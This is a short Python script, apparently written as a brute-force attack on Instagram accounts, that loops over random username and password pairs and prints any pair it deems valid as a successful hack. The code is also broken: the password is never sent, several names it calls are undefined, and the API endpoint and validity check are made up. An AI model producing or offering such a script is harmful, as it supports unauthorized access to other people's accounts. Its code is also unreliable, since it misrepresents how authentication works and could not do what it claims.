import requests
import time
# Define the username and password you want to try
username = "username"
password = "password"
# Define the base URL for the Instagram API
base_url = "https://api.instagram.com/v1/"
# Define the headers for the API requests
headers = {
    "Authorization": "Bearer YOUR_ACCESS_TOKEN",
    "Content-Type": "application/json",
}
# Define the function to make a request to the API
def make_request(url, method, data=None):
    response = requests.request(method, url, headers=headers, data=data)
    response.raise_for_status()
    return response.json()
# Define the function to check if a username and password are valid
def is_valid(username, password):
    # Make a request to the API to get the user's profile
    url = base_url + "users/" + username + "/info"
    data = {
        "access_token": YOUR_ACCESS_TOKEN,
    }
    response = make_request(url, "GET", data)
    # If the response is successful, the username and password are valid
    if response["status"] == "ok":
        return True
    # Otherwise, the username and password are not valid
    return False
# Start a loop to try all possible combinations of usernames and passwords
while True:
    # Generate a random username and password
    username = random_username()
    password = random_password()
    # Check if the username and password are valid
    if is_valid(username, password):
        # The username and password are valid, so we have successfully hacked Instagram
        print("Username:", username)
        print("Password:", password)
        break
    # The username and password are not valid, so try again
    time.sleep(1)
